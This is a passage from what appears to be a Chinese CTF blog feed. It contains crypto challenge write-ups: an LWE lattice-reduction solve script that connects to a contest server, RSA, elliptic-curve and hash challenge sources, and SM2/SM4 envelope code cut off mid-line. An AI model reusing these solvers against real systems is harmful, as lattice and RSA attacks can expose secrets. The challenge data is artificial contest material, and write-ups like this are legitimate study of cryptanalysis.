mode=display">令，b'_{i}\equiv b_{i}-\sum_{j=0}^{n-1}(A_{i,j,0})\pmod{p}</script><script type="math/tex; mode=display">令，A'_{i,j}\equiv A_{i,j,1}-A_{i,j,0}\pmod{p}</script><script type="math/tex; mode=display">有，b'_i \equiv \left( \sum_{j=0}^{n-1} A'_{i, j} \cdot s_j + e_i \right) \pmod{p}</script><script type="math/tex; mode=display">可看做，b'_{i}\equiv A'_{i}\cdot s_{j}+e_{i} \pmod{p}</script><script type="math/tex; mode=display">有，A'_{i}\cdot s_{j}-b'_{i}=-e_{i}+K_{i}p</script><p>$构造下面这个 (n+m+1)×(n+m+1) 维的格的基矩阵 L：$</p><script type="math/tex; mode=display">L = \begin{pmatrix} \mathbf{I}_{n \times n} & (\mathbf{A'})_{n \times m}^T & \mathbf{0}_{n \times 1} \\ \mathbf{0}_{m \times n} & p \cdot \mathbf{I}_{m \times m} & \mathbf{0}_{m \times 1} \\ \mathbf{0}_{1 \times n} & -(\mathbf{b'})^T_{1 \times m} & 1 \\ \end{pmatrix}</script><p>$PS：这里为什么取的是转置矩阵呢？因为矩阵乘法的规定是行乘列$</p><p>$取一个组合向量c=(s_{0},…,s_{35},k_{0},…,k_{49},1)，计算目标向量v=c\cdot L$<br>$I_{n}为单位矩阵，则v的前n个分量为(s_{0},…,s_{35})$<br>$最后一个分量为1，可以通过它来判断规约出来目标向量是否是我们想要的向量$<br>$中间m个分量，第i个分量是(s <em> A’^T)_i + (k </em> pI)_i + (1 * -b’^T)_i$<br>$也就是，\sum_{j=0}^{n-1}A’_{i,j}\cdot s_{j}-b’_{i}+k_{i}p=-e_{i}+K_{i}p+k_{i}p$<br>$如果k_{i}=-K_{i}，中间就是-e_{i}了，很小的一个分量，这样就完美地得到短向量v$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 1: Replicate the problem&#x27;s parameters and matrix &#x27;A&#x27; generation.</span></span><br><span class="line"><span class="comment"># The random seed is fixed, so &#x27;A&#x27; will be the same every time.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">p, n, m = <span class="number">257</span>, <span class="number">36</span>, <span class="number">50</span></span><br><span class="line"><span class="comment"># import random</span></span><br><span class="line"><span class="comment"># random.seed(int(1337))</span></span><br><span class="line"><span class="comment"># A = [[[random.randrange(p) for _ in range(2)] for _ in range(n)] for _ in range(m)]</span></span><br><span class="line">A = []</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 2: Connect to the server and receive the public vector &#x27;B&#x27;.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;node8.anna.nssctf.cn&#x27;</span>, <span class="number">22485</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;give you B: &#x27;</span>)</span><br><span class="line">B_str = conn.recvline().strip().decode()</span><br><span class="line">B = <span class="built_in">eval</span>(B_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Received B vector of length <span class="subst">&#123;<span class="built_in">len</span>(B)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 3: Formulate the LWE problem by calculating A&#x27; and b&#x27;.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">A_prime = Matrix(GF(p), m, n)</span><br><span class="line">b_prime = vector(GF(p), m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    sum_A0 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A_prime[i, j] = A[i][j][<span class="number">1</span>] - A[i][j][<span class="number">0</span>]</span><br><span class="line">        sum_A0 += A[i][j][<span class="number">0</span>]</span><br><span class="line">    b_prime[i] = B[i] - sum_A0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] LWE system constructed successfully.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 4: Construct the lattice basis matrix for LLL.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">dim = n + m + <span class="number">1</span></span><br><span class="line">L = Matrix(ZZ, dim, dim)</span><br><span class="line">L.set_block(<span class="number">0</span>, <span class="number">0</span>, Matrix.identity(n))</span><br><span class="line">L.set_block(n, n, Matrix.identity(m) * p)</span><br><span class="line">L.set_block(<span class="number">0</span>, n, A_prime.transpose())</span><br><span class="line"><span class="comment"># -- MODIFICATION IS HERE --</span></span><br><span class="line"><span class="comment"># The original set_block failed because b_prime is a vector.</span></span><br><span class="line"><span class="comment"># We replace it with direct row slicing and assignment.</span></span><br><span class="line">L[dim - <span class="number">1</span>, n:n+m] = -b_prime.lift() <span class="comment"># 有限域到整数域的转换</span></span><br><span class="line">L[dim - <span class="number">1</span>, dim - <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Lattice basis matrix of shape <span class="subst">&#123;L.dimensions()&#125;</span> constructed.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 5: Run the LLL algorithm.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Running LLL algorithm... This might take a moment.&quot;</span>)</span><br><span class="line">L_reduced = L.LLL()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] LLL algorithm completed.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 6: Extract the secret bits from the shortest vector.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">solution_vector = L_reduced[<span class="number">0</span>]</span><br><span class="line">secret_bits = []</span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">abs</span>(solution_vector[n + m]) == <span class="number">1</span>:</span><br><span class="line">    sign = <span class="built_in">int</span>(solution_vector[n + m])</span><br><span class="line">    s_bits_raw = solution_vector[:n] * sign</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(bit <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>) <span class="keyword">for</span> bit <span class="keyword">in</span> s_bits_raw):</span><br><span class="line">        secret_bits = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> s_bits_raw]</span><br><span class="line">        found = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Valid secret bits found in the first vector of the reduced basis!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Could not find a valid solution vector.&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 7: Reconstruct and send the secret.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">secret = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">if</span> secret_bits[i] == <span class="number">1</span>:</span><br><span class="line">        secret += (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Reconstructed secret: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(secret).encode())</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 8: Receive the flag.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">flag = conn.recvall(timeout=<span class="number">2</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[FLAG] <span class="subst">&#123;flag.strip()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h2 id="IqqT"><a href="#IqqT" class="headerlink" title="IqqT*"></a>IqqT*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> (GCD(p-<span class="number">1</span>,q-<span class="number">1</span>)) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Dbits = <span class="number">440</span></span><br><span class="line">N = p*q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d1 = getPrime(Dbits)</span><br><span class="line">d2 = getPrime(Dbits)</span><br><span class="line">e1 = <span class="built_in">pow</span>(d1, -<span class="number">1</span>,phi)</span><br><span class="line">e2 = <span class="built_in">pow</span>(d2, -<span class="number">1</span>,phi)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e1,N)</span><br><span class="line">c = <span class="built_in">pow</span>(c,e2,N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 153098639535230461427067981471925418840838598338005180035334795636906122233147195601425250354397215037964687813767036136951747775082105669481477681815877751367786247871862319200300034505895599830252899234816623479894529037827470533297869568936005422622937802442126007732338221711447957108942595934348420152967</span></span><br><span class="line"><span class="comment"># e1 = 26675174225063019792412591801113799130868333007861486357720578798352030914999710926292644671603600643369845213171396954004158372043593223603274138224817810197939227716991483870437629436082594926630937775718564690554680519001757082557490487364436474044434348412437933432480883175650430050712391958500932343901</span></span><br><span class="line"><span class="comment"># e2 = 43950877784211432364704383093702059665468498126670135130662770287054349774316943441695986309047768423965591753129960761705976613430837039441242214744782506036708881166308335886272786409715558332802625980679432726451306523481798238346507261619084743433957076290727858148266709423500224748925763767341340730807</span></span><br><span class="line"><span class="comment"># c = 93877717323267388927595086106164695425439307573037159369718380924127343418544815509333679743420188507149532789861080535086578879105173477672709484480809535461054572173818555600022970592546859742598747214025487041690467952494343056536435494716815059600034890617984024099540213482984895312025775728869974483561</span></span><br></pre></td></tr></table></figure><script type="math/tex; mode=display">c\equiv m^{e1\cdot e2}\pmod N</script><h2 id="HiddenOracle"><a href="#HiddenOracle" class="headerlink" title="HiddenOracle*"></a>HiddenOracle*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> treasure <span class="keyword">import</span> FLAG, p, a, b</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [a,b])</span><br><span class="line">A = [randint(<span class="number">0</span>,p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">B = <span class="built_in">sorted</span>([randint(<span class="number">0</span>,p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)])</span><br><span class="line">oracle = <span class="keyword">lambda</span> x: <span class="built_in">sum</span>([a*<span class="built_in">pow</span>(<span class="built_in">int</span>(x),b,p) <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(A,B)])*E.lift_x(<span class="number">0x1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>, oracle(<span class="built_in">input</span>(<span class="string">&quot;[?] &quot;</span>)).xy())</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[*]&quot;</span>)) == A[<span class="number">0</span>]: <span class="built_in">print</span>(FLAG)</span><br></pre></td></tr></table></figure><h2 id="LeetSpe4k"><a href="#LeetSpe4k" class="headerlink" title="LeetSpe4k*"></a>LeetSpe4k*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">le4t = <span class="keyword">lambda</span> x: <span class="string">&quot;&quot;</span>.join(choice(<span class="built_in">next</span>((j <span class="keyword">for</span> j <span class="keyword">in</span> [<span class="string">&#x27;a@4A&#x27;</span>, <span class="string">&#x27;b8B&#x27;</span>, <span class="string">&#x27;cC&#x27;</span>, <span class="string">&#x27;dD&#x27;</span>, <span class="string">&#x27;e3E&#x27;</span>, <span class="string">&#x27;fF&#x27;</span>, <span class="string">&#x27;g9G&#x27;</span>, <span class="string">&#x27;hH&#x27;</span>, <span class="string">&#x27;iI&#x27;</span>, <span class="string">&#x27;jJ&#x27;</span>, <span class="string">&#x27;kK&#x27;</span>, <span class="string">&#x27;l1L&#x27;</span>, <span class="string">&#x27;mM&#x27;</span>, <span class="string">&#x27;nN&#x27;</span>, <span class="string">&#x27;o0O&#x27;</span>, <span class="string">&#x27;pP&#x27;</span>, <span class="string">&#x27;qQ&#x27;</span>, <span class="string">&#x27;rR&#x27;</span>, <span class="string">&#x27;s$5S&#x27;</span>, <span class="string">&#x27;t7T&#x27;</span>, <span class="string">&#x27;uU&#x27;</span>, <span class="string">&#x27;vV&#x27;</span>, <span class="string">&#x27;wW&#x27;</span>, <span class="string">&#x27;xX&#x27;</span>, <span class="string">&#x27;yY&#x27;</span>, <span class="string">&#x27;z2Z&#x27;</span>] <span class="keyword">if</span> i <span class="keyword">in</span> j), i)) <span class="keyword">for</span> i <span class="keyword">in</span> x.decode())</span><br><span class="line">h4sH = <span class="keyword">lambda</span> x: reduce(<span class="keyword">lambda</span> acc, i: ((acc * (<span class="number">2</span>**<span class="number">255</span>+<span class="number">95</span>)) % <span class="number">2</span>**<span class="number">256</span>) + i, x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(le4t(flag), h4sH(flag))</span><br><span class="line"><span class="comment">#nSsCtf&#123;H@pPy_A7h_4nNiv3R$arY_ns$C7F_@nD_l3t$_d0_7h3_LllE3t$pEAk!&#125; 9114319649335272435156391225321827082199770146054215376559826851511551461403</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/80/v2-831f9285e57fba50f2eb1a6dc8c2b4eb_1440w.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;哦豁，这场化身&lt;strong&gt;AI大师&lt;/strong&gt;，周末上大分&lt;/p&gt;
&lt;h1 </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>熵密杯2025-重庆</title>
    <link href="https://hvang10.github.io/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/"/>
    <id>https://hvang10.github.io/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/</id>
    <published>2025-07-23T01:42:30.000Z</published>
    <updated>2025-07-23T02:34:12.735Z</updated>
    
    <content type="html"><![CDATA[<p>很好，属于是来<strong>重庆旅</strong>游来了，先爆一下战绩，初始谜题做了一个，差点爆零(bushi)</p><p>去年还能做两个初始谜题，后面的夺旗闯关还能有点思路，就是不会写而已</p><p>今年的夺旗闯关就真不会了，看得懂一点，但具体不知道要干嘛，<strong>证书 sm4 sm2</strong> 什么的不会啊</p><p><strong>Rank: 90+/205</strong>，去年好像也是90多，但今年参赛队伍多了不少，难度也难了不少，都没人AK了()，去年四五支队伍AK，我那一列就两三个……</p><p><img src="https://picx.zhimg.com/80/v2-e27b748bcf186cc8475d699cc535386a_1440w.png" alt=""></p><h2 id="初始谜题1"><a href="#初始谜题1" class="headerlink" title="初始谜题1*"></a>初始谜题1*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sm4_encrypt.py</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.decoder <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> univ, namedtype</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3, func, sm2</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.encoder <span class="keyword">import</span> encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2Cipher</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;xCoordinate&#x27;</span>, univ.Integer()), <span class="comment"># -- x 分量</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;yCoordinate&#x27;</span>, univ.Integer()),             <span class="comment"># -- y 分量</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;hash&#x27;</span>, univ.OctetString()),                <span class="comment"># --哈希值</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cipherText&#x27;</span>, univ.OctetString())           <span class="comment"># -- SM4密钥密文</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EncryptedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;algorithm&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.156.10197.1.104.2&#x27;</span>)), <span class="comment"># -- SM4-CBC OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;iv&#x27;</span>, univ.OctetString()),                                                <span class="comment"># -- SM4-CBC加密使用的初始化向量（IV）</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cipherText&#x27;</span>, univ.OctetString())                                         <span class="comment"># -- SM4加密的密文</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EnvelopedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;encryptedKey&#x27;</span>, SM2Cipher()),                           <span class="comment"># -- 使用SM2公钥加密SM4密钥的密文</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;encryptedData&#x27;</span>, EncryptedData()),                                  <span class="comment">#  -- 使用SM4密钥对明文加密的密文</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digestAlgorithm&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span>)), <span class="comment"># -- SM3算法OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digest&#x27;</span>, univ.OctetString())                                       <span class="comment"># -- 对明文计算的摘要值</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_cbc_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>):</span><br><span class="line">    backend = default_backend()</span><br><span class="line">    cipher = Cipher(algorithms.SM4(key), modes.CBC(iv), backend=backend) <span class="comment">#填充模式 nopadding</span></span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm2_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>,public_key:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    sm2_crypt = sm2.CryptSM2(private_key=<span class="string">&quot;&quot;</span>,public_key=public_key.<span class="built_in">hex</span>())</span><br><span class="line">    ciphertext = sm2_crypt.encrypt(plaintext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm3_hash</span>(<span class="params">text:<span class="built_in">bytes</span></span>):</span><br><span class="line">    hash_value = sm3.sm3_hash(func.bytes_to_list(text))</span><br><span class="line">    <span class="keyword">return</span> hash_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_key_from_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            key = file.read().strip()</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 <span class="subst">&#123;file_path&#125;</span> 未找到。&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 发生了未知错误 <span class="subst">&#123;e&#125;</span>。&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对由abcd组成的字符串加密的方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">plaintext:<span class="built_in">str</span>,sm2_public_key: <span class="built_in">str</span>,sm4_iv:<span class="built_in">str</span></span>):</span><br><span class="line">    sm4_key = <span class="built_in">bytes</span>.fromhex(read_key_from_file(<span class="string">&quot;key.txt&quot;</span>)) <span class="comment">#从文件读取固定的key</span></span><br><span class="line">    <span class="comment"># sm4</span></span><br><span class="line">    envelope = EnvelopedData()</span><br><span class="line">    plaintext_bytes = plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    ciphertext = sm4_cbc_encrypt(plaintext_bytes,sm4_key,<span class="built_in">bytes</span>.fromhex(sm4_iv))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    encrypted_key = sm2_encrypt(sm4_key,<span class="built_in">bytes</span>.fromhex(sm2_public_key))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm3</span></span><br><span class="line">    digest = sm3_hash(plaintext_bytes)</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>] = EncryptedData()</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;iv&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(sm4_iv))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>] = univ.OctetString(ciphertext)</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>] = SM2Cipher()</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;xCoordinate&#x27;</span>] = univ.Integer(<span class="built_in">int</span>.from_bytes(encrypted_key[:<span class="number">32</span>], <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;yCoordinate&#x27;</span>] = univ.Integer(<span class="built_in">int</span>.from_bytes(encrypted_key[<span class="number">32</span>:<span class="number">64</span>], <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;hash&#x27;</span>] = univ.OctetString(encrypted_key[<span class="number">64</span>:<span class="number">96</span>])</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>] = univ.OctetString(encrypted_key[<span class="number">96</span>:])</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;digest&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(digest))</span><br><span class="line">    <span class="keyword">return</span> encode(envelope).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从asn1格式的16进制字符串提取参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asn1_parse</span>(<span class="params">asn1_hex_str:<span class="built_in">str</span>,asn1_spec</span>):</span><br><span class="line">    <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">    der_bytes = binascii.unhexlify(asn1_hex_str)</span><br><span class="line">    <span class="comment"># 解码为ASN.1对象</span></span><br><span class="line">    enveloped_data, _ = decode(der_bytes, asn1Spec=asn1_spec)</span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    sm2_x = <span class="built_in">hex</span>(<span class="built_in">int</span>(enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;xCoordinate&#x27;</span>]))[<span class="number">2</span>:]</span><br><span class="line">    sm2_y = <span class="built_in">hex</span>(<span class="built_in">int</span>(enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;yCoordinate&#x27;</span>]))[<span class="number">2</span>:]</span><br><span class="line">    sm2_hash = enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;hash&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line">    sm2_ciphertext = enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm4</span></span><br><span class="line">    sm4_algorithm = <span class="built_in">str</span>(enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;algorithm&#x27;</span>])</span><br><span class="line">    sm4_iv = enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;iv&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line">    sm4_cipherText = enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm3</span></span><br><span class="line">    digestAlgorithm = <span class="built_in">str</span>(enveloped_data[<span class="string">&#x27;digestAlgorithm&#x27;</span>])</span><br><span class="line">    digest = enveloped_data[<span class="string">&#x27;digest&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出提取的值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;asn1格式的16进制字符串:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  asn1: <span class="subst">&#123;asn1_hex_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM2参数:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  xCoordinate: <span class="subst">&#123;sm2_x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  yCoordinate: <span class="subst">&#123;sm2_y&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  hash: <span class="subst">&#123;sm2_hash&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  cipherText: <span class="subst">&#123;sm2_ciphertext&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM4参数:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  algorithm: <span class="subst">&#123;sm4_algorithm&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  iv: <span class="subst">&#123;sm4_iv&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  cipherText: <span 